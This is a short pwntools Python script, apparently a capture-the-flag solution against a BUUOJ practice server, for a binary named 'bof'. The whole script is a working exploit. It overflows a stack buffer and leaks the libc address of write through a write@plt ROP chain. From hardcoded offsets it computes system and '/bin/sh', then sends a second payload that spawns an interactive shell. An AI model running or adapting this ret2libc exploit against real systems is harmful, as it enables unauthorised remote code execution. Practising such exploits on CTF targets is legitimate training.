from pwn import *


# p = process("./bof")
p = remote("node4.buuoj.cn", 25171)
pro = ELF("./bof")

# context.log_level = "debug"

write_p = pro.plt["write"]
write_g = pro.got["write"]
start = 0x080483E0

def leak():
    p.recv()
    pad = cyclic(0x6c+0x4)
    pad += p32(write_p)+p32(start)+p32(1)+p32(write_g)+p32(4)
    p.send(pad)
    info = p.recvuntil("We", drop=True)

    return info

# count
info = u32(leak())
print("info: ", hex(info))
base = info-0xd43c0
system = base+0x3a940
binsh = base+0x15902b

# attack
pad = cyclic(0x6c+0x4)
pad += p32(system)+p32(0)+p32(binsh)
p.send(pad)

p.interactive()

